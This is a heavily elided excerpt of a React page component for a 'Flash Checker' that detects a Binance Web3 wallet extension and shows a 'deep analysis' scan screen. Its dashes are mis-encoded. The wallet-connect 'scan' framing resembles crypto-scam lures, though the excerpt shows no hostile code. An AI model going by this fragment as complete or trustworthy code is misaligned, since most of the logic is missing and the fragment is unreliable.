...
export default function ConnectPage() {
  ...
  /* ----------------------------------------------------
     CONNECTED STATE ï¿½ Flash scan / result
  ------------------------------------------------------- */
            ...
            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,200,0,0.15)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 18 }}>
                ...
                <div>
                  ...
                  <div style={{ fontSize: 11.5, color: "#7a7f96", marginTop: 2 }}>Deep analysis in progress ï¿½ do not close this page</div>
                </div>
              </div>
  ...
  /* ----------------------------------------------------
     PRE-CONNECT STATE ï¿½ Flash Checker landing
  ------------------------------------------------------- */
  return (
    <div style={S.page}>
      <div style={S.card}>
              ...
              {hasExtension ? (
                <>
                  <div style={{ fontSize: 11.5, color: "#7a7f96", textAlign: "center", lineHeight: 1.5 }}>
                    Binance Web3 extension detected ï¿½ ready to scan
                  </div>
